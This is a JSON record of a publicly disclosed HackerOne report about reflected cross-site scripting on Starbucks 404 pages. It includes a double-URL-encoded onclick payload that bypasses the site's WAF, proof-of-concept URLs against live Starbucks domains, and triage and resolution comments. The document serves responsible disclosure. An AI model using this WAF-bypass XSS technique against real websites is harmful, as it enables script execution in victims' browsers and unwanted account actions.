{"id":629745,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82Mjk3NDU=","url":"https://hackerone.com/reports/629745","title":"Reflected cross-site scripting on multiple Starbucks assets.","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2019-06-26T07:05:03.094Z","submitted_at":"2019-06-26T07:05:03.094Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"stealthy","url":"/stealthy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/389/161/5f1c02457f4a872a3356d5c6675a87488fb53000_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1989,"url":"https://hackerone.com/starbucks","handle":"starbucks","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Starbucks","twitter_handle":"Starbucks","website":"http://www.starbucks.com","about":"Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-10-16T18:53:26.084Z","bug_reporter_agreed_on_going_public_at":"2019-09-25T15:38:44.311Z","team_member_agreed_on_going_public_at":"2019-10-16T18:53:25.981Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\u003e NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Please indicate NA, if not applicable. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!\n\n**Summary:** [Many Starbucks websites are vulnerable to cross-site scripting on 404 pages because double quotes lack sanitizing in hidden input tags, which leads to JavaScript execution.]\n\n**Description:** [Starbucks employs a WAF which redirects any URL with a double quote to an error page. However, using double encoding, this can be bypassed. I used double encoding for most of the payload, which includes white spaces. My payload is below.\n\n```text\nhtp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm`1`%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1\n```\nThe payload is just the on click event with the access key set as x, and the rest of a Starbucks URL added as an arbitrary parameter to make sure the onclick event works.\n```text\nhtp8bi2zcg\" accesskey='x' onclick='confirm`1`' //2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1\n```\nThis vulnerability affects multiple Starbucks websites. Two are listed below.\n\n    https://www.starbucks.co.uk/htp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm%601%60%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1\n\n    https://www.starbucks.fr/htp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm%601%60%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1\n\nThe vulnerable HTML is below.\n```html\n\u003clink rel=\"canonical\" href=\"https://www.starbucks.co.uk/htp8bi2zcg\" accesskey=\"x\" onclick=\"confirm`1`\" 2injectiontrme47nbfq=\"\" blonde=\"\" bright-sky-blend=\"\" ground=\"1\u0026quot;\"\u003e\n```\nAs you can see, the injection is successful.]\n\n**Platform(s) Affected:** [Tested in Firefox Quantum 67.0.]\n\n## Steps To Reproduce:\n\n(Add details for how we can reproduce the issue)\n\n1: Visit the link below.\n\n    https://www.starbucks.fr/htp8bi2zcg%2522%2520accesskey=%2527x%2527%2520onclick=%2527confirm%601%60%2527%2520//2injectiontrme47nbfq/blonde/bright-sky-blend/ground=1\n\n2: The key bind on MAC is CONTROL+ALT+X and on Windows is ALT+SHIFT+X.\n\n## Supporting Material/References:\n\n  * List any additional material (e.g. screenshots, logs, etc.)\n{F516988}\n██████\n\n\n## How can the system be exploited with this bug?\nExecute arbitrary JavaScript in a victim's browser to steal information or perform unwanted actions on the victim's behalf.\n\n## How did you come across this bug ?\nI was trying to bypass the double quote filter for SQL injection and came across this XSS when I looked at the HTML.\n\n## Recommendations for fix\n \n* Escape double quotes.\n\n## Impact\n\nJavaScript is against Starbucks users on multiple critical domains. JavaScript execution results in information theft and an attacker can perform unwanted actions on a victim's behalf.","bounty_amount":"150.0","formatted_bounty":"$150","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":516988,"file_name":"Screen_Shot_2019-06-25_at_11.41.40_PM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/516/988/d3a038ec3da76a21c5b538cb490a54dba5ff0327/Screen_Shot_2019-06-25_at_11.41.40_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-06-25_at_11.41.40_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-06-25_at_11.41.40_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151331Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=baedb0284c7d400317388a62a61881daf461edfdf91750393d9cd047d527d49e","file_size":197441,"type":"image/png"}],"allow_singular_disclosure_at":"2019-10-25T15:38:44.448Z","allow_singular_disclosure_after":-61947287.37418891,"singular_disclosure_allowed":true,"vote_count":69,"voters":["thaivu","mashoud1122","sameerphad72","stealthy","ali","probatorem","sudi","tulswani","dmc3","0-1","and 59 more..."],"severity":{"rating":"low","score":3.4,"author_type":"Team","metrics":{"attack_vector":"adjacent","attack_complexity":"high","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":13017,"asset_type":"URL","asset_identifier":"www.starbucks.co.uk","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":5198063,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello @stealthy, and thank you for your report.\n\nCan you provide a complete list of affected assets in order to avoid multiple reports over time?\n\nCheers,\n@still","automated_response":false,"created_at":"2019-06-26T08:57:14.332Z","updated_at":"2019-06-26T08:57:14.332Z","actor":{"username":"still","cleared":false,"url":"/still","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/390/243/51ce849c0c189ad15dade380626c7b85a3fb9332_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5198080,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-06-26T09:00:34.143Z","updated_at":"2019-06-26T09:00:34.143Z","additional_data":{"old_severity":"Medium (4.2)","new_severity":"Low (3.4)","old_severity_id":444379,"new_severity_id":444547},"actor":{"username":"still","cleared":false,"url":"/still","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/390/243/51ce849c0c189ad15dade380626c7b85a3fb9332_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5201569,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hello @still,\n\nThe list below includes the websites I have successfully exploited the vulnerability on.\n\n* starbucks.de\n* starbucks.co.uk\n* starbucks.fr\n* fr.starbucks.ca\n* starbucks.ie\n* starbucks.ca\n* starbucks.com.br\n","automated_response":false,"created_at":"2019-06-26T19:19:53.497Z","updated_at":"2019-06-26T19:24:10.305Z","actor":{"username":"stealthy","cleared":true,"url":"/stealthy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/389/161/5f1c02457f4a872a3356d5c6675a87488fb53000_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5202224,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"@stealthy Thanks for reporting the issue. We have reached out to our development team to confirm and fix the issue.","automated_response":false,"created_at":"2019-06-26T21:59:00.975Z","updated_at":"2019-06-26T21:59:00.975Z","actor":{"username":"nitrobr3w","cleared":false,"url":"/nitrobr3w","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5226759,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@nitrobr3w No problem! I have more coming.\n\nAlso, going to point out that XSS like this can be used to modify account details that only require the `__RequestVerificationToken`. Emails cannot be changed for account takeover because they require a password. However, an attacker can force actions to be completed on other users' accounts which only require the csrf token. I know your team already knows this :), but I want to clarify.\n\n","automated_response":false,"created_at":"2019-07-01T05:27:36.470Z","updated_at":"2019-07-01T05:28:46.406Z","actor":{"username":"stealthy","cleared":true,"url":"/stealthy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/389/161/5f1c02457f4a872a3356d5c6675a87488fb53000_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5233546,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Considering the vulnerability is bound to multiple sites we would like to award you as per our standards.  ","automated_response":false,"created_at":"2019-07-01T20:36:41.240Z","updated_at":"2019-07-01T20:36:41.240Z","actor":{"url":"/starbucks","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Starbucks"}},"bounty_amount":"150.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"starbucks","collaborator":{"username":"stealthy","url":"/stealthy"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5722941,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @stealthy,\n\nWe received notification from the team that this has been resolved. I just retested and confirmed that the POC payload results in an error response for each of the listed domains. If you observe otherwise, please let us know and we'll revisit.\n\nThank you again for the report!\n\n@shadegrown ","automated_response":false,"created_at":"2019-09-03T22:15:26.162Z","updated_at":"2019-09-03T22:15:26.162Z","actor":{"username":"shadegrown","cleared":false,"url":"/shadegrown","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/241/256/c58560470742940abd59de20f14746b5f8b2dcd2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"stealthy","url":"/stealthy"},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5888302,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi @shadegrown @still @starbucks,\n\nI would like to disclose this. Can a team member please redact video ███████.\n","automated_response":false,"created_at":"2019-09-25T15:38:44.340Z","updated_at":"2019-10-02T18:41:47.860Z","first_to_agree":true,"actor":{"username":"stealthy","cleared":true,"url":"/stealthy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/389/161/5f1c02457f4a872a3356d5c6675a87488fb53000_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6058057,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-10-16T18:53:26.000Z","updated_at":"2019-10-16T18:53:26.000Z","actor":{"username":"agedsumatra","cleared":false,"url":"/agedsumatra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yjUg6PZmutR2o3qPxEP2MT1J/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6058058,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-10-16T18:53:26.105Z","updated_at":"2019-10-16T18:53:26.105Z","actor":{"username":"agedsumatra","cleared":false,"url":"/agedsumatra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yjUg6PZmutR2o3qPxEP2MT1J/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":18523,"category":"team","content":"@stealthy discovered that invalid page requests resulting in a 404 error page response were vulnerable to Reflected Cross-site Scripting (XSS) when double encoding a link and persuading the user to press an unusual key combination.\n\nThank you @stealthy for bringing this to our attention and helping to resolve the issue.","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":706273,"username":"agedsumatra","name":"agedSumatra","bio":"","cleared":false,"website":null,"location":"","created_at":"2019-08-12T17:50:49.926Z","url":"https://hackerone.com/agedsumatra","anc_triager":false,"hackerone_triager":false,"hackerone_employee":null,"user_type":"company","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/yjUg6PZmutR2o3qPxEP2MT1J/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/yjUg6PZmutR2o3qPxEP2MT1J/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/yjUg6PZmutR2o3qPxEP2MT1J/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}},{"id":18382,"category":"researcher","content":"Reflected cross-site scripting on multiple Starbucks in scope assets. The reflection took place in hidden inputs and exploitation required user interaction. This vulnerability affected 404 not found pages. \n\nPOC:```\"accesskey='x' onclick='confirm`1`' //``` in URL path with double URL encoding to bypass WAF. ","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":389161,"username":"stealthy","name":"Stealthy","bio":"Bug Hunter.","cleared":true,"website":null,"location":"Chicago","created_at":"2018-10-28T06:23:24.300Z","url":"https://hackerone.com/stealthy","anc_triager":false,"hackerone_triager":false,"hackerone_employee":null,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/389/161/5f1c02457f4a872a3356d5c6675a87488fb53000_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/389/161/5f1c02457f4a872a3356d5c6675a87488fb53000_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/389/161/5f1c02457f4a872a3356d5c6675a87488fb53000_original.jpg/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}